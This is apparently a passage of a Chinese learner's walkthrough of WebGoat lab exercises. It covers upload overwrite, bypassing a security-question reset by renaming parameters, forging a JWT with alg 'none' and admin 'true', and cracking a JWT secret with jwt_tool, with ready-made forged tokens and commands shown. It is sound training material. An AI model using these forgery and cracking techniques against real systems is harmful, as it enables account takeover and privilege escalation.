这一次，开发人员只允许您上传 zip 文件，但是，他们犯了一个编程错误，因为上传 zip 文件会提取它，但不会替换您的图像。您能找到一种方法来绕过编程错误来覆盖当前映像吗？</p>
<p>这题我没想明白考点</p>
<p>我就直接找了一张照片压缩成zip上传就成功了。。。</p>
<p>本来还想抓包看看的</p>
<p>当我们去查看题目中的目录，发现ZIP已经被解压缩。这意味着，如果有相同文件名称的文件的话，将会被新文件覆盖。<br>
正确的做法是，将所有上传的文件都经过一遍安全校验和安全设置，并将文件给一个强随机的文件名，避免文件覆盖问题。</p>
<h2 id="4-Broken-Authentication（身份验证绕过）">4.Broken Authentication（身份验证绕过）</h2>
<h3 id="1-Authentication-Bypass（身份验证绕过）">1.Authentication Bypass（身份验证绕过）</h3>
<h4 id="1-3">1.</h4>
<p>Authentication Bypasses<br>
Authentication Bypasses happen in many ways, but usually take advantage of some flaw in the configuration or logic. Tampering to achieve the right conditions.</p>
<p>Hidden inputs<br>
The simplest form is a reliance on a hidden input that is in the web page/DOM.</p>
<p>Removing Parameters<br>
Sometimes, if an attacker doesn’t know the correct value of a parameter, they may remove the parameter from the submission altogether to see what happens.</p>
<p>Forced Browsing<br>
If an area of a site is not protected properly by configuration, that area of the site may be accessed by guessing/brute-forcing.</p>
<p>身份验证绕过<br>
身份验证绕过以多种方式发生，但通常会利用配置或逻辑中的某些缺陷。篡改以达到正确的条件。</p>
<p>隐藏输入<br>
最简单的形式是依赖于网页/DOM 中的隐藏输入。</p>
<p>删除参数<br>
有时，如果攻击者不知道参数的正确值，他们可能会从提交中完全删除该参数，以查看会发生什么情况。</p>
<p>强制浏览<br>
如果站点的某个区域未通过配置得到适当保护，则可以通过猜测/暴力破解来访问该站点的该区域。</p>
<h4 id="2-5">2.</h4>
<p><a target="_blank" rel="noopener" href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">案例连接</a></p>
<p>您正在重置密码，但从您的提供商无法识别的位置或设备进行重置。因此，您需要回答您设置的安全问题。另一个问题是 这些安全问题也存储在另一台设备上（不是与您一起），而您不记得它们。</p>
<p>您已经提供了您的用户名/电子邮件，并选择了其他验证方法。</p>
<p>其实就是照着步骤复现就是了。。。有这么简单就好了</p>
<p>果然删除没有作用，看了提示说是修改参数</p>
<p>经过尝试发现修改成secQuestion需要有两个，且参数不为0和1就行，我试过数字或则字母都行</p>
<p>这位博主参看了源码，而且也讲得很详细👉<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37138074/article/details/128930146">WebGoat-8.2.2版靶机学习总结_webgoat8.2.2-CSDN博客</a></p>
<p>通过查看代码第59/61/88行可知，当参数中存在“%secQuestion%”的变量时请求就可以通过。符号%表示任意字符/串。</p>
<h3 id="2-JWT-tokens">2.JWT tokens</h3>
<h4 id="1-Json-Web-Token">1.Json Web Token</h4>
<h5 id="什么是JWT">什么是JWT</h5>
<p>Json Web Token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7519">RFC 7519</a>。</p>
<p>该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景，是目前最流行的跨域认证解决方案。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<h5 id="JWT-的原理">JWT 的原理</h5>
<p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;姓名&quot;</span><span class="punctuation">:</span> <span class="string">&quot;张三&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;角色&quot;</span><span class="punctuation">:</span> <span class="string">&quot;管理员&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;到期时间&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。</p>
<p>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p>
<h5 id="JWT-的数据结构">JWT 的数据结构</h5>
<p>实际当中 JWT 长这个样子：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/2.png" alt=""></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0.Y2PuC-D6SfCRpsPN19_1Sb4WPJNkJr7lhG6YzA8-9OQ</span><br></pre></td></tr></table></figure>
<p>它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的</p>
<p>JWT 的三个部分依次如下:</p>
<ul>
<li>Header（头部）</li>
<li>Payload（负载）</li>
<li>Signature（签名）</li>
</ul>
<p>写成一行，就是下面的样子。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header.Payload.Signature</span><br></pre></td></tr></table></figure>
<p>每个部分最后都会使用 base64URLEncode方式进行编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">function base64url_encode($data) &#123;</span><br><span class="line">    <span class="keyword">return</span> rtrim(strtr(base64_encode($data), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>), <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/1.png" alt=""></p>
<h5 id="Header">Header</h5>
<p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，以上面的例子，使用 base64decode 之后：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>header部分最常用的两个字段是alg和typ。</p>
<p>alg属性表示token签名的算法(algorithm)，最常用的为HMAC和RSA算法</p>
<p>typ属性表示这个token的类型（type），JWT 令牌统一写为JWT。</p>
<h5 id="Payload">Payload</h5>
<p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p>
<ul>
<li>iss (issuer)：签发人</li>
<li>exp (expiration time)：过期时间</li>
<li>sub (subject)：主题</li>
<li>aud (audience)：受众</li>
<li>nbf (Not Before)：生效时间</li>
<li>iat (Issued At)：签发时间</li>
<li>jti (JWT ID)：编号</li>
</ul>
<p>除了官方字段，还可以在这个部分定义私有字段，以上面的例子为例，将 payload 部分解 base64 之后：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0</span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CTFHub&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1516239022</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：JWT 默认是不会对 Payload 加密的，也就意味着任何人都可以读到这部分JSON的内容，所以不要将私密的信息放在这个部分</p>
</blockquote>
<h5 id="Signature">Signature</h5>
<p>Signature 部分是对前两部分的签名，防止数据篡改</p>
<p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，<strong>使用 Header 里面指定的签名算法（默认是 HMAC SHA256）</strong>，按照下面的公式产生签名。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
<p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用&quot;点&quot;（.）分隔，就可以返回给用户。</p>
<p>参考链接</p>
<p><a target="_blank" rel="noopener" href="https://jwt.io/introduction/">官网解释</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html"> 阮一峰老师亲作</a>(力推，写的很清晰)</p>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/JSON_Web_Token">JSON Web Token - Wikipedia</a></p>
<ol start="3">
<li></li>
</ol>
<p>这里直接解码就行了，可以用<a target="_blank" rel="noopener" href="https://jwt.io/">JSON Web Tokens </a>的也可以用Webwolf自带的功能</p>
<h4 id="5-8">5.</h4>
<p>尝试更改您收到的令牌并通过更改令牌成为管理员用户，并在您成为管理员后重置投票</p>
<p>点击投票之后抓包</p>
<p>解码</p>
<p>头部的算法改成none</p>
<p>payload部分的admin：false改成true</p>
<p>两个部分用base64加密，加密后拼接在一起如下面的格式，记得小数点</p>
<blockquote>
<p>因为加密后会有=号，然后jwt需要把=去点</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciIDogIm5vbmUiCn0.ewogICJhZG1pbiIgOiAidHJ1ZSIsCiAgImlhdCIgOiAxNzA0ODc4MTY1LAogICJ1c2VyIiA6ICJUb20iCn0.</span><br></pre></td></tr></table></figure>
<p>改完发送就行了</p>
<h4 id="6-5">6.</h4>
<p>这是对第5题的解答？</p>
<p>Solution<br>
The idea behind this assignment is that you can manipulate the token which might cause the server to interpret the token differently. In the beginning when JWT libraries appeared they implemented the specification to the letter meaning that the library took the algorithm specified inside the header and tried to work with it.</p>
<p>Signed JSON Web Tokens carry an explicit indication of the signing algorithm, in the form of the “alg” Header Parameter, to facilitate cryptographic agility. This, in conjunction with design flaws in some libraries and applications, has led to several attacks:</p>
<p>The algorithm can be changed to “none” by an attacker, and some libraries would trust this value and “validate” the JWT without checking any signature.</p>
<p>An “RS256” (RSA, 2048 bit) parameter value can be changed into “HS256” (HMAC, SHA-256), and some libraries would try to validate the signature using HMAC-SHA256 and using the RSA public key as the HMAC shared secret (see [McLean] and [CVE-2015-9235]).</p>
<p>For mitigations, see Sections 3.1 and 3.2.</p>
<p>— <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc8725#section-2.1">https://tools.ietf.org/html/rfc8725#section-2.1</a><br>
What basically happened was that libraries just parsed the token as it was given to them without validating what cryptographic operation was used during the creation of the token.</p>
<p>Solution<br>
First note that we are logged in as so first select a different user for example: Tom. User Tom is allowed to vote as you can see, but he is unable to reset the votes. Looking at the request this will return an in the response:Guestaccess_token</p>
<p>GET <a target="_blank" rel="noopener" href="http://localhost:8080/WebGoat/JWT/votings/login?user=Tom">http://localhost:8080/WebGoat/JWT/votings/login?user=Tom</a> HTTP/1.1</p>
<p>access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDgxMjg1NjYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.rTSX6PSXqUoGUvQQDBiqX0re2BSt7s2-X6FPf34Qly9SMpqIUSP8jykedJbjOBNlM3_CTjgk1SvUv48Pz8zIzA<br>
Decoding the token gives:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS512&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;false&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We can change the claim to but then signature will become invalid. How do we end up with a valid signature? Looking at the RFC specification is a valid choice and gives an unsecured JWT. Let’s change our token:adminfalsealg: none</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">headers:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;none&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">claims:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;true&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we use WebWolf to create our token we get:</p>
<p>eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE2MDgxMjg1NjYsDQogICJ1c2VyIiA6ICJUb20iDQp9<br>
Now we can replace the token in the cookie and perform the reset again. One thing to watch out for is to add a at the end otherwise the token is not valid…</p>
<p>溶液<br>
此分配背后的想法是，您可以操作令牌，这可能会导致服务器以不同的方式解释令牌。一开始，当 JWT 库出现时，它们实现了规范，这意味着库采用了标头中指定的算法并尝试使用它。</p>
<p>签名的 JSON Web 令牌带有签名的显式指示 算法，以 “alg” Header Parameter 的形式，以方便 加密敏捷性。这与设计缺陷相结合 一些库和应用程序导致了几次攻击：</p>
<p>攻击者可以将该算法更改为“无”，并且某些算法 库将信任此值并“验证”JWT，而无需 检查任何签名。</p>
<p>“RS256”（RSA，2048 位）参数值可以更改为 “HS256”（HMAC、SHA-256），一些库会尝试验证 使用 HMAC-SHA256 并使用 RSA 公钥作为 HMAC 共享密钥（请参阅 [McLean] 和 [CVE-2015-9235]）。</p>
<p>有关缓解措施，请参阅第 3.1 节和第 3.2 节。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc8725#section-2.1">https://tools.ietf.org/html/rfc8725#section-2.1</a><br>
基本上发生的事情是，库只是在提供给他们的令牌时解析令牌，而没有验证在创建令牌期间使用的加密操作。</li>
</ul>
<p>溶液<br>
首先请注意，我们已登录，因此首先选择其他用户，例如：Tom。 如您所见，用户 Tom 被允许投票，但他无法重置投票。查看请求，这将在响应中返回：Guestaccess_token</p>
<p>GET <a target="_blank" rel="noopener" href="http://localhost:8080/WebGoat/JWT/votings/login?user=Tom">http://localhost:8080/WebGoat/JWT/votings/login?user=Tom</a> HTTP/1.1</p>
<p>access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDgxMjg1NjYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.rTSX6PSXqUoGUvQQDBiqX0re2BSt7s2-X6FPf34Qly9SMpqIUSP8jykedJbjOBNlM3_CTjgk1SvUv48Pz8zIzA<br>
解码令牌给出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS512&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;false&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以将声明更改为，但签名将失效。我们如何最终获得有效的签名？ 查看 RFC 规范是一个有效的选择，并给出了一个不安全的 JWT。 让我们更改我们的令牌：adminfalsealg: none</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">headers:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;none&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">claims:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;iat&quot;: 1608128566,</span><br><span class="line">  &quot;admin&quot;: &quot;true&quot;,</span><br><span class="line">  &quot;user&quot;: &quot;Tom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们使用 WebWolf 创建我们的令牌，我们会得到：</p>
<p>eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE2MDgxMjg1NjYsDQogICJ1c2VyIiA6ICJUb20iDQp9<br>
现在我们可以替换 cookie 中的令牌并再次执行重置。需要注意的一件事是在末尾添加 a，否则令牌无效。.</p>
<h4 id="7-3">7.</h4>
<p>查看parseClaimsJwt()的源码注释</p>
<p>Parses the specified compact serialized JWT string based on the builder’s current configuration state and returns the resulting unsigned plaintext JWT instance. This is a convenience method that is usable if you are confident that the compact string argument reflects an unsigned Claims JWT. An unsigned Claims JWT has a Claims body and it is not cryptographically signed. If the compact string presented does not reflect an unsigned Claims JWT, an UnsupportedJwtException will be thrown.</p>
<p>根据生成器的当前配置状态分析指定的紧凑序列化JWT字符串，并返回结果的无签名明文JWT实例。这是一个方便的方法，如果您确信紧凑字符串参数反映了未签名的声明JWT，则可以使用。未签名的索赔JWT具有索赔主体，并且它没有加密签名。如果提供的紧凑字符串不反映未签名的声明JWT，则将引发UnsupportedJwtException。<br>
查看parse()的源码注释</p>
<p>Parses the specified compact serialized JWT string based on the builder’s current configuration state and returns the resulting JWT or JWS instance. This method returns a JWT or JWS based on the parsed string. Because it may be cumbersome to determine if it is a JWT or JWS, or if the body/payload is a Claims or String with instanceof checks, the #parse(String,JwtHandler) method allows for a type-safe callback approach that may help reduce code or instanceof checks.</p>
<p>根据生成器的当前配置状态分析指定的紧凑序列化JWT字符串，并返回结果的JWT或JWS实例。此方法根据解析的字符串返回JWT或JWS。由于确定它是JWT还是JWS，或者正文/有效负载是带有实例检查的声明或字符串可能会很麻烦，因此#解析（字符串，JwtHandler）方法允许一种类型安全的回调方法，这可能有助于减少代码或实例检查。</p>
<p>所以答案是</p>
<p>1</p>
<p>3</p>
<h4 id="8-2">8.</h4>
<p>这个需要找工具，可以用提示里面的hashcat</p>
<p>也可以用jwt-tools</p>
<p>我用的是jwt-tools，然后字典用提示里面的，下载命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/first20hours/google-10000-english</span><br></pre></td></tr></table></figure>
<p>命令如下，jwt记得换成自己的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py jwt -C -d 字典</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">参数-C表示对JWT进行压缩，以缩短字节长度。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">参数-d指定了一个字典文件，该文件包含用于尝试破解JWT的可能密钥列表。</span></span><br></pre></td></tr></table></figure>
<p>然后提示我的密钥是shipping</p>
<p>把密钥换上去，然后username换成WebGoat，还有就是时间问题</p>
<p>因为令牌都有自己的时间，如果不改的话会提示</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JWT expired at 2023-12-31T16:31:50Z. Current time: 2023-12-31T18:47:35Z, a difference of 8145871 milliseconds. Allowed clock skew: 0 milliseconds.</span><br></pre></td></tr></table></figure>
<p>即过期了</p>
<p>exp尽量改大些就行了</p>
<ol start="9">
<li></li>
</ol>
<p>Refreshing a token<br>
Introduction<br>
In this section we touch upon refreshing an access token.</p>
<p>Types of tokens<br>
In general there are two types of tokens: an access token and a refresh token. The access token is used for making API calls towards the server. Access tokens have a limited life span, that’s where the refresh token comes in. Once the access token is no longer valid a request can be made towards the server to get a new access token by presenting the refresh token. The refresh token can expire but their life span is much longer. This solves the problem of a user having to authenticate again with their credentials. Whether you should use a refresh token and an access token depends, below can find a couple of points to keep in mind while choosing which tokens to use.</p>
<p>So a normal flow can look like:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H -d &#x27;username=webgoat&amp;password=webgoat&#x27; localhost:8080/WebGoat/login</span><br></pre></td></tr></table></figure>
<p>The server returns:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;token_type&quot;:&quot;bearer&quot;,</span><br><span class="line">    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,</span><br><span class="line">    &quot;expires_in&quot;:10,</span><br><span class="line">    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>As you can see the refresh token is a random string which the server can keep track of (in memory or store in a database) in order to match the refresh token to the user the refresh token was granted to. So in this case whenever the access token is still valid we can speak of a “stateless” session, there is no burden on the server side to setup the user session, the token is self contained. When the access token is no longer valid the server needs to query for the stored refresh token to make sure the token is not blocked in any way.</p>
<p>Whenever the attacker gets a hold on an access token it is only valid for a certain amount of time (say 10 minutes). The attacker then needs the refresh token to get a new access token. That is why the refresh token needs better protection. It is also possible to make the refresh token stateless but this means it will become more difficult to see if the user revoked the tokens. After the server made all the validations it must return a new refresh token and a new access token to the client. The client can use the new access token to make the API call.</p>
<p>What should you check for?<br>
Regardless of the chosen solution you should store enough information on the server side to validate whether the user is still trusted. You can think of many things, like store the ip address, keep track of how many times the refresh token is used (using the refresh token multiple times in the valid time window of the access token might indicate strange behavior, you can revoke all the tokens and let the user authenticate again). Also keep track of which access token belonged to which refresh token otherwise an attacker might be able to get a new access token for a different user with the refresh token of the attacker (see <a target="_blank" rel="noopener" href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/</a> for a nice write up about how this attack works) Also a good thing to check for is the ip address or geolocation of the user. If you need to give out a new token check whether the location is still the same if not revoke all the tokens and let the user authenticate again.</p>
<p>Need for refresh tokens<br>
Does it make sense to use a refresh token in a modern single page application (SPA)? As we have seen in the section about storing tokens there are two options: web storage or a cookie which mean a refresh token is right beside an access token, so if the access token is leaked chances are the refresh token will also be compromised. Most of the time there is a difference of course. The access token is sent when you make an API call, the refresh token is only sent when a new access token should be obtained, which in most cases is a different endpoint. If you end up on the same server you can choose to only use the access token.</p>
<p>As stated above using an access token and a separate refresh token gives some leverage for the server not to check the access token over and over. Only perform the check when the user needs a new access token. It is certainly possible to only use an access token. At the server you store the exact same information you would store for a refresh token, see previous paragraph. This way you need to check the token each time but this might be suitable depending on the application. In the case the refresh tokens are stored for validation it is important to protect these tokens as well (at least use a hash function to store them in your database).</p>
<p>刷新令牌<br>
介绍<br>
在本节中，我们将介绍如何刷新访问令牌。</p>
<p>token类型<br>
通常，有两种类型的令牌：访问令牌和刷新令牌。访问令牌用于制作 API 对服务器的调用。访问令牌的生命周期有限，这就是刷新令牌的用武之地。一次 访问令牌不再有效，可以向服务器发出请求，通过提供 刷新令牌。刷新令牌可能会过期，但其生命周期要长得多。这解决了用户的问题 必须使用其凭据再次进行身份验证。是否应使用刷新令牌和访问令牌取决于： 下面可以找到在选择要使用的令牌时要记住的几点。</p>
<p>因此，正常流程可能如下所示：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H -d &#x27;username=webgoat&amp;password=webgoat&#x27; localhost:8080/WebGoat/login</span><br></pre></td></tr></table></figure>
<p>服务器返回：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;token_type&quot;:&quot;bearer&quot;,</span><br><span class="line">    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,</span><br><span class="line">    &quot;expires_in&quot;:10,</span><br><span class="line">    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如您所见，刷新令牌是一个随机字符串，服务器可以跟踪它（在内存中或存储在数据库中） 为了将刷新令牌与用户匹配，已向其授予刷新令牌。 因此，在这种情况下，只要访问令牌仍然有效，我们就可以说是“无状态”会话，有 服务器端没有设置用户会话的负担，令牌是自包含的。 当访问令牌不再有效时，服务器需要查询存储的刷新令牌，以确保令牌 不会以任何方式被阻止。</p>
<p>每当攻击者保留访问令牌时，它仅在一定时间（例如 10 分钟）内有效。这 然后，攻击者需要刷新令牌来获取新的访问令牌。这就是为什么刷新令牌需要更好的保护。 也可以使刷新令牌无状态，但这意味着如果 用户吊销了令牌。 服务器完成所有验证后，必须向客户端返回新的刷新令牌和新的访问令牌。这 客户端可以使用新的访问令牌进行 API 调用。</p>
<p>你应该检查什么？<br>
无论选择哪种解决方案，您都应该在服务器端存储足够的信息，以验证用户是否 仍然值得信赖。你可以想到很多事情，比如存储IP地址，跟踪刷新多少次 使用令牌（在访问令牌的有效时间窗口内多次使用刷新令牌可能表示奇怪 行为，您可以撤销所有令牌并让用户再次进行身份验证）。 此外，还要跟踪哪个访问令牌属于哪个刷新令牌，否则攻击者可能会 能够使用攻击者的刷新令牌为其他用户获取新的访问令牌 （请参阅 <a target="_blank" rel="noopener" href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/%EF%BC%8C%E4%BA%86%E8%A7%A3%E6%9C%89%E5%85%B3%E6%AD%A4%E6%94%BB%E5%87%BB%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%84%E7%B2%BE%E5%BD%A9%E6%96%87%E7%AB%A0%EF%BC%89">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/，了解有关此攻击如何工作的精彩文章）</a> 另外，要检查的一件好事是用户的 IP 地址或地理位置。如果您需要发出新的令牌检查 位置是否仍然相同，如果没有，请撤销所有令牌并让用户再次进行身份验证。</p>
<p>需要刷新令牌<br>
